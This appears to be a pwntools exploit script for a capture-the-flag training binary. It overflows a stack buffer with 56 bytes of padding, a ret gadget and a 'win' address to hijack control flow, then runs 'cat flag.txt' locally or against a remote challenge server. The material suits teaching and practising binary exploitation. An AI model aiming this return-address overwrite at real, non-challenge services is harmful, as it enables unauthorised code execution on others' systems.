#!/usr/bin/python3
from pwn import *
import os

elf = context.binary = ELF("training_problem")

gs = '''
b *0x40119a
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 13545)
    else:
        return process(elf.path)

# Plan:

# addr
#win = 0x401196
win = 0x40119a
offset = 56 # to ret instr
nop_ret = 0x40110f


io = start()

p = p64(0)*7 + p64(nop_ret) + p64(win)

io.recv()
io.sendline(p)

io.sendline(b"cat flag.txt")
print(io.recvline())
io.close()
#io.interactive() # can do without
